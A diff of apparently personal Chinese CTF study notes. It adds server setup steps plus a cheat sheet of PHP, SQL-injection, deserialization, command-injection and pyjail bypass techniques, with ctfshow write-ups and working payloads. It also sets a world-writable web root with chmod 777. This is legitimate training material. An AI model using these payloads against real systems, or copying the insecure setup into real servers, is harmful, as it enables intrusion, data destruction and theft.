@@ -1,6 +1,6 @@
 ﻿---
 title: "搭建服务器"
-lastmod: 2026-06-07T23:59:38+08:00
+lastmod: 2026-06-10T19:09:25+08:00
 draft: false
 ---
 ```bash
@@ -8,7 +8,20 @@ if [ -f /usr/bin/curl ];then curl -sSO https://download.bt.cn/install/install_pa
 ```
 
 宝塔直接搭
+或者纯净的服务器
+```
+sudo apt update && sudo apt install -y apache2 php libapache2-mod-php
+```
 
+```
+<?php
+	file_put_contents('1.txt', date('Y-m-d H:i:s') . ' ' . ($_GET['a'] ?? '') . PHP_EOL, FILE_APPEND);
+?>
+```
+记得给文件加上权限
+```
+sudo chmod 777 /var/www/html
+```
 ## 1) 安装 Nginx + PHP-FPM（推荐）
 
 ```plain
@@ -136,6 +149,408 @@ curl -i http://YOUR_SERVER_IP/
 ```
 
 看到 `OK, PHP is working.` 或 phpinfo 页面，就说明通了。
+
+# 补充笔记整理
+
+下面这部分是把之前分散记录的知识点按主题补进来，方便后面统一查。
+
+## PHP 注入与语言特性
+
+### 正则与类型绕过
+
+- 正则整型注入常见思路：
+  - 改变进制，例如以 `0` 开头转八进制
+  - 改成数组
+  - 添加换行
+  - 利用类型转换
+- 字符串场景下，可以尝试异常类型、奇怪地址、哈希碰撞类输入。
+- 程序里很多匹配是先转换再匹配，要先看是否存在隐式类型转换。
+- 正则里 `%00` 可以视作截断，但有些函数如 `strrev()` 可能把后面的内容翻转到前面。
+- `.+?` 是非贪婪匹配，但如果开头第 0 位就不满足，可能整体不命中。
+- 超长字符串时，某些正则对 100 万字符后的内容不会继续匹配。
+
+### 变量、函数与全局环境
+
+- `GLOBALS` 以数组形式保存全局变量。
+- `$_SERVER['argv']` 可以拿命令行参数，有时能借 GET 参数进入。
+- `gettext` 有别名 `_`，可以直接当函数调用。
+- `call_user_func(a, b)` 本质上是调用 `a(b)`。
+- `call_user_func()` 也可以配合数组或类方法使用。
+- 没有参数的类方法可以用 `类名::函数名` 调用。
+- 变量名会有转换规则：
+  - 第一个非法字符会被转成下划线
+  - 点和空格会被转成下划线
+- `extract()`、`parse_str()` 可以把输入转成变量，经常能造成二次赋值绕过。
+- 对变量名或变量值做限制时，可以尝试两次解析变量来绕过，例如把 `POST[X]` 放进 GET 再解析。
+- 抓住双 `$$` 的标量赋值点。
+
+### 文件、目录与读取函数
+
+- `scandir()` 可以列当前目录。
+- `FilesystemIterator` 可以遍历当前目录。
+- `is_file()` 可结合包装器或伪协议绕过，不一定影响其他函数。
+- `highlight_file()` / `show_source()` 不能处理数组。
+- `readfile()`、`file_get_contents()`、`fgets()`、`file()`、`fopen()` 都是常见读文件函数。
+- `copy()`、`rename()` 有时也能辅助拿到文件内容。
+- `flag.php` 有时需要查看网页源代码而不是直接访问页面结果。
+
+### 代码执行与构造
+
+- 有 `eval()` 时优先考虑直接注入代码。
+- `hex2bin()` 可用于把十六进制转成二进制字符串，从而构造代码。
+- 哈希比较场景下，类型改变可能让结果变成 `null`。
+- `null == null` 可用于宽松比较。
+- 在变量后面加 `()` 时，可以考虑找类或异常类来接管调用。
+- `create_function()` 可以动态创建函数。
+- `}` 可以提前闭合代码块，后面接自己的语句。
+- 善用注释 `/* ... */` 截断无用部分。
+- 可以用 `ping`、DNSLog、二级域名等方式做结果外带。
+- `ls /` 和 `cat /*` 是常见的最短探测方式。
+
+### 命名空间与特殊写法
+
+- PHP 默认命名空间是 `\`，有时函数名前加 `/` 可以干扰正则处理。
+- `new ReflectionClass('xxx')` 可以根据字符串反射类。
+- 可以尝试中文变量、特殊符号、弱比较和命名空间组合绕过。
+
+### `is_numeric()` 绕过
+
+1. 数组 + 十六进制
+
+```text
+j[]=58B
+```
+
+2. 利用空格或空字节
+
+```text
+j=1315%20
+j=1315%00
+```
+
+3. 利用 PHP 比较时先转数值
+
+```text
+j=9999a
+```
+
+### 一些零散但常用的点
+
+- `c=show_source(next(array_reverse(scandir(pos(localeconv())))));`
+- `pos(localeconv())` 可以得到一个点。
+- 限制字符串长度时，可以尝试再次引用自身。
+- `array_slice()` 是“截取数组并返回新数组”，不是删除后返回被删元素。
+- `show_source(next(array_reverse(scandir(pos(localeconv())))))` 这种链式写法要能快速识别。
+
+## SQL 注入
+
+### 基础思路
+
+- 万能钥匙：
+
+```sql
+where username !='flag' and id = '' or 1=1 %23
+```
+
+- `%23` 在 URL 中相当于 `#`，后面会被当注释。
+- `UNION` 可用于拼接第二个查询结果；如果第一部分为空，结果几乎全来自第二部分。
+- 回显中如果要查 `flag`，可以用 `hex()`、`replace()`、`group_concat()` 等函数做绕过。
+
+### 常见技巧
+
+- 可能因为输出格式要求，需要补齐列数，例如 `1,password` 变成 `1,1,password`。
+- `replace(查询语句,'旧','新')` 可用于替换敏感词。
+- 无回显时考虑时间盲注，用 `if()` + `sleep()`。
+- 空格被过滤时可替代为：
+  - `%09`
+  - `%0a`
+  - `%0d`
+  - `%0c`
+  - `/**/`
+  - `+`
+  - 某些场景可试反引号或顿号
+- `like` 可做模糊匹配，适合正则场景绕过。
+- `where` 被禁用时，可尝试：
+  - `group by`
+  - `having`
+  - `regexp`
+
+### 数字过滤绕过
+
+- 过滤数字时可用表达式替代：
+
+```text
+false               -> 0
+true                -> 1
+true+true           -> 2
+floor(pi())         -> 3
+ceil(pi())          -> 4
+floor(pi())+true    -> 5
+floor(pi())+floor(pi()) -> 6
+floor(pi())+ceil(pi())  -> 7
+ceil(pi())+ceil(pi())   -> 8
+floor(pi())*floor(pi()) -> 9
+floor(pi())*floor(pi())+true -> 10
+```
+
+- 过滤数字时还可以用 `char()` 和布尔表达式配合 ASCII 运算。
+
+### 盲注截取技巧
+
+- `ascii('str')` 只返回第一个字符的 ASCII。
+- `right()` 可从右截取：
+
+```sql
+ascii(right('abc',2)) = 97
+```
+
+- `left()` 可以和 `reverse()` 配合：
+
+```sql
+ascii(reverse(left('abc',2))) = 97
+```
+
+### 信息收集语句
+
+```sql
+select group_concat(table_name) from information_schema.tables where table_schema=database();
+select group_concat(column_name) from information_schema.columns where table_name='ctfshow_user';
+```
+
+### 堆叠与重建
+
+- 可以用堆叠查询删表、建表、插数据来重置环境：
+
+```sql
+drop table ctfshow_user;
+create table ctfshow_user(`username` varchar(20),`pass` varchar(20));
+insert ctfshow_user values('1','2');
+```
+
+- 可以交换字段名做逻辑绕过：
+
+```sql
+alter table ctfshow_user change `username` `passw2` varchar(100);
+alter table ctfshow_user change `pass` `username` varchar(100);
+alter table ctfshow_user change `passw2` `pass` varchar(100);
+```
+
+- 括号受限时，可把 `varchar()` 改成 `text`。
+
+### 其他补充
+
+- `ffifdyop` 的 MD5 常被拿来做万能密码场景。
+- `mysql` 是弱类型比较，比较前会先做类型转换。
+- PHP 里 `$row[0]` 可以覆盖预期输出。
+- 没有空格时，可以尝试把元素用括号包起来。
+- 测试过滤时先用 `1,2,3` 定位，再一个个命令试。
+
+## 反序列化
+
+### 总体思路
+
+- 总思路：通过控制序列化类的属性和魔术方法，触发目标行为。
+- 调试本地环境时可以用：
+
+```bash
+php -S localhost:8000 -c "D:\php-8.4.7-nts-Win32-vs17-x64\php.ini"
+```
+
+### 常见魔术方法
+
+- `__construct()`：对象创建时调用
+- `__destruct()`：对象销毁时调用
+- `__sleep()`：`serialize()` 时调用
+- `__wakeup()`：`unserialize()` 时调用
+- `__unserialize()`：新版本反序列化入口
+- `__invoke()`：对象当函数调用时执行
+- `__toString()`：对象转字符串时执行
+- `__get()` / `__set()`：属性读写时执行
+- `__call()`：调用不存在的方法时执行
+- `__clone()`：对象克隆时执行
+
+### Session 与处理器
+
+- `$_SESSION` 是保存站点全局会话数据的变量。
+- `session_start()` 用于开启会话。
+- `php` 和 `php_serialize` 是两种不同的 session 序列化处理器：
+  - `php`：`键名|序列化值`
+  - `php_serialize`：整个数组整体序列化
+- 可用：
+
+```php
+ini_set('session.serialize_handler','php_serialize');
+```
+
+- 找 cookie 写入 session 的地方时，要确认有没有 base64。
+- 注意不同文件里处理器可能不同。
+
+### 常见利用点
+
+- `serialize()` 后面多跟几个字符可能会报错，但不一定影响反序列化结果。
+- `__destruct()` 不需要手动调用，只要成功反序列化出对象，销毁时就会触发。
+- 被 session 保存的对象，在 session 反序列化时也可能被自动全部触发。
+- 题目有替换逻辑时，可以通过“长度不变但替换后长度变化”的方式做逃逸。
+- `&` 可以把两个变量绑定到同一块内存地址。
+- `file_get_contents('php://input')` 常用于拿原始 POST 数据，注意 `application/x-www-form-urlencoded` 或 raw。
+- 可以通过破坏序列化结构但保留类名，绕过一些浅层判断。
+- 链子被过滤时，换另一条同框架 Gadget Chain。
+
+### PhAR 相关
+
+- PhAR 反序列化敏感函数很多，常见包括：
+  - `file_exists`
+  - `is_file`
+  - `fopen`
+  - `readfile`
+  - `file_get_contents`
+  - `copy`
+  - `unlink`
+  - `md5_file`
+  - `sha1_file`
+  - `hash_file`
+  - `getimagesize`
+  - `exif_imagetype`
+- `Phar::getMetadata()` 会自动反序列化元数据。
+- 可以利用条件竞争，在上传和读取 phar 的时间差里触发。
+
+### Python 补充
+
+- Python 里序列化与反序列化常见是：
+  - `pickle.dumps()`
+  - `pickle.loads()`
+- 有时可以借反序列化拿到反弹 shell。
+
+## 命令执行
+
+### 空格与分隔符绕过
+
+- 空格过滤时可尝试：
+  - `%09`
+  - `%0a`
+  - `%0d`
+  - `%0c`
+  - `/**/`
+  - `+`
+  - `${IFS}`
+  - `$IFS$1`
+  - `[$(IFS)]`
+- 命令截断常用：
+  - `;`
+  - `%0a`
+  - `&`
+  - `||`
+
+### 文件读取与伪协议
+
+- `php://filter/read=convert.base64-encode/resource=flag.php`
+- `data://text/plain,xxx` 可以让解释器把逗号后内容当正文。
+- `get_defined_vars()` 可以拿到当前所有变量，再配合 `array_pop()`、`next()` 绕过参数限制。
+- `include`、`file_get_contents`、`highlight_file`、`show_source` 都能用于读文件。
+
+### 常见执行函数与等价替换
+
+- `system()`、`passthru()`、`shell_exec()` 常互相替代。
+- `eval()` 没有回显时，可以先 `echo` 再执行。
+- `shell_exec = system` 在很多题里能直接替换使用。
+
+### Shell 小技巧
+
+- `1>/dev/null` 表示把标准输出重定向到空设备。
+- `uniq`：去除相邻重复行。
+- `grep`：搜文件内容，可配 `-i`、`-v`、`-n`、`-c`、`-r`、`-E`。
+- `mv`：换文件名后再看。
+- `pwd`：看当前绝对路径。
+- `ls / -1`：单列输出根目录。
+
+### 临时文件与上传利用
+
+- 上传文件常见临时位置：
+  - Linux：`/tmp/phpXXXXXX`
+  - Windows：`C:\Users\zuziyi\AppData\Local\Temp\phpXXXX.tmp`
+- 可通过上传后在临时目录定位文件，再交给解释器执行：
+
+```bash
+sh /tmp/xxx
+php /tmp/xxx
+python /tmp/xxx
+```
+
+- 直接执行脚本时，脚本头常见：
+
+```sh
+#!/bin/sh
+```
+
+### 无字母数字与特殊构造
+
+- `echo $(())` 的结果是 `0`
+- `$((~$(())))` 是 `-1`
+- 利用位运算和算术展开可以在无数字、无字母场景拼值
+- `${_}` 代表上一次命令执行的结果
+
+### 目录枚举与 open_basedir 绕过
+
+- `scandir()` 被过滤可以试 `glob()`
+- 两种常见目录读取方式：
+
+```php
+print_r(scandir(dirname('__FILE__')));
+$a = new DirectoryIterator('glob:///*'); foreach($a as $f){ echo $f->__toString()." "; }
+```
+
+- `glob://` 在某些 `open_basedir` 场景下不受限制。
+- 还可用：
+
+```php
+if ($b = opendir("glob:///*")) {
+    while (($file = readdir($b)) !== false) {
+        echo $file . "\n";
+    }
+    closedir($b);
+}
+```
+
+### 输出抢占与日志污染
+
+- 可以用 `exit` / `die` 提前终止，避免后面过滤。
+- 可以用输出缓冲抢内容：
+
+```php
+$ss = ob_get_contents();
+ob_end_clean();
+echo $ss;
+```
+
+- 日志污染常见思路：
+  - 先在 UA 头里注入
+  - 再 `include /var/log/nginx/access.log`
+- 前提是目标能执行被包含的文件。
+
+### 数据库配合读取文件
+
+```php
+try {
+    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
+    foreach ($dbh->query('select load_file("/flag36.txt")') as $row) {
+        echo ($row[0]) . "|";
+    }
+    $dbh = null;
+} catch (PDOException $e) {
+    echo $e->getMessage();
+    exit(0);
+}
+```
+
+### 其他零散点
+
+- `include/require` 可以直接执行 PHP 文件。
+- 有些扩展也会间接执行外部程序，例如：
+  - `imagick`
+  - `ffmpeg` 相关扩展
+- `var_dump(get_defined_vars())` 可以拿当前所有变量。
+- `str_repeat()` 被过滤时，有时可用 `sprintf()` 顶替部分构造。
+- `explode()` / `str_split()` 在数组和字符串切换时很有用。
 
 # 文件上传
 注意windows的ntfs流，可以通过::$DATA绕过
@@ -3053,7 +3468,7 @@ flag.php里面什么都没有
 
 \[23:17:41] 200 -    2KB - /alsckdfy/index.php
 
-# 其他-特殊绕过
+# 其他-特殊函数
 ## 396
 ```php
 <?php
@@ -3384,4 +3799,278 @@ echo new show($_GET[f]);
 ctf::flag可以直接通过call_user_func调用一个class里的函数
 其实直接调用ctf::flag也能达到同样的效果
 所以这道题目直接输出结果就行
+# 其他-shell命令
+## 417
+疯狂的混淆，什么sb题目
+## 418
+```php
+<?php  
+$key= 0;  
+$clear='clear.php';  
+highlight_file(__FILE__);  
+//获取参数  
+$ctfshow=$_GET['ctfshow'];  
+//包含清理脚本  
+include($clear);  
+extract($_POST);  
+if($key===0x36d){
+    //帮黑阔写好后门
+        eval('<?php '.$ctfshow.'?>');  
+}else{
+    $die?die('FLAG_NOT_HERE'):clear($clear);  
+}
+```
+额，这一道题目纯粹靠猜
+猜到clear是shell命令，然后直接通过`;`分割注入
+die=0&clear=;cp flag.php 1.txt
+## 419
+```php
+<?php    
+highlight_file(__FILE__);    
+$code = $_POST['code'];  
+if(strlen($code) < 17){  
+    eval($code);  
+}
+```
+写成`code=eval($_GET[a])`就行了，然后你直接用get来传入参数
+## 420
+```php
+<?php   
+highlight_file(__FILE__);  
+$code = $_POST['code'];  
+if(strlen($code) < 8){    system($code);  
+}
+```
+?code=nl ../*
+这个nl指的是根据编号输出文件内容，在这里可以直接把这个目录下的所有内容输出
+## 421
+```php
+<?php  
+highlight_file(__FILE__);  
+$code = $_POST['code'];  
+if(strlen($code) < 6){    system($code);  
+}
+```
+字符长度限制变成了6
+还是nl命令，变成了`nl f*`
+感觉其实`nl *`也可以输出当前目录下的所有东西
+## 422
+长度限制少了一位，但是就上面写的，直接`nl *`就可以了
+# 其他 pyjail
+## 423
+没有给你源代码，看起来是一个黑盒
+提示是?code=
+get传入试一下
+```
+# Internal Server Error
+
+The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
+```
+不对劲，然后post传入试一下
+```
+# Method Not Allowed
+
+The method is not allowed for the requested URL.
+```
+由此可见肯定不是POST传参，问题就是get怎么传参
+这个是后端程序报错了，没能正确传入
+fuzz了一下，""的时候返回了200
+输入了一下，好像是直接输出了我输入的所有东西，但是没有解析
+那么可以大胆猜测一下，可能是echo直接输出的，试一下通过;闭合进行注入
+不是，看了一下题解，是pyjail注入
+code=os.popen('ls /').read()
+这个是源代码
+```python
+from flask import Flask 
+from flask import request 
+import os 
+
+app = Flask(__name__) 
+@app.route('/') 
+def app_index():
+	code = request.args.get('code') 
+	if code: 
+		return eval(code) 
+	return 'where is flag?<!-- /?code -->' 
+
+if __name__=="__main__": 
+	app.run(host='0.0.0.0',port=80)
+```
+## 424
+还是没有源代码的
+`os.popen("ls /").read()`这个命令报了内部错误，应该是禁用了shell命令，换一种方法测试
+`open("/flag").read()`这个就能直接读取
+然后打开源代码看一下
+```python
+from flask import Flask
+from flask import request
+
+
+app = Flask(__name__)
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+## 425
+先试一下open直接看
+额，直接拿到了，读取一下源代码
+```python
+from flask import Flask
+from flask import request
+
+
+app = Flask(__name__)
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	if 'os' not in code:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+过滤了字符串中的os，但是并不影响这个直接打开的做法
+## 426
+还是直接open直接绕过
+读取一下源代码
+```python
+from flask import Flask
+from flask import request
+import re
+
+app = Flask(__name__)
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	reg = re.compile(r'os|popen')
+    	if reg.match(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+正则匹配了os或者popen
+而且match函数是从头开始匹配，只匹配文件头的函数，所以其实并不需要什么东西直接写就行
+## 427
+还是open直接绕过
+```python
+from flask import Flask
+from flask import request
+import re
+
+app = Flask(__name__)
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	reg = re.compile(r'os|popen|system|read')
+    	if reg.match(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+还是从头匹配os，popen，system
+## 428
+还是open直接绕过
+```python
+from flask import Flask
+from flask import request
+import re
+
+app = Flask(__name__)
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	reg = re.compile(r'os|open|system|read')
+    	if reg.match(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+增加了read，但是read是在后面使用，所以其实可以直接绕过
+## 429
+好了，终于绕不过去了
+根据他之前的惯性，他的正则匹配好像还是用的从头匹配
+试一下开头用空格
+```python
+from flask import Flask
+from flask import request
+import re
+
+app = Flask(__name__)
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	reg = re.compile(r'os|open|system|read')
+    	if reg.match(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+我的评价是你的正则不改该用不了还是用不了
+## 430
+加空格依旧可以绕过
+```python
+from flask import Flask
+from flask import request
+import re
+
+app = Flask(__name__)
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	reg = re.compile(r'os|open|system|read|eval')
+    	if reg.match(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+
+```
+查看一下，多了eval，但是还是直接加一个空格绕过
+## 431
+依旧是直接使用开头的空格绕过
+```python
+from flask import Flask
+from flask import request
+import re
+
+app = Flask(__name__)
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	reg = re.compile(r'os|open|system|read|eval|str')
+    	if reg.match(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+多了一个str，然而并不知道怎么用str绕过
+str(open('/flag').read())
+用这个可以包含一下，绕过
+也可以`__import__("os").popen("ls").read()`绕过
+## 432
 
